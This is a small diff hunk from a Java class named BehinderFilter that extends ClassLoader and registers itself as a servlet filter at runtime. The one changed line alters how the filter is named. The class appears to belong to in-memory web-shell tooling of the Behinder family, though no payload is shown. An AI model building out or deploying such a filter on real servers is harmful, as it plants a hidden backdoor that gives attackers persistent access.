@@ -118,7 +118,7 @@ public final class BehinderFilter extends ClassLoader implements Filter {
     public String addFilter() throws Exception {
         ServletContext servletContext = this.request.getServletContext();
         Filter filter = this;
-        String filterName = this.path;
+        String filterName = "BehinderFilter" + this.path;
         String url = this.path;
 
         Field contextField = null;
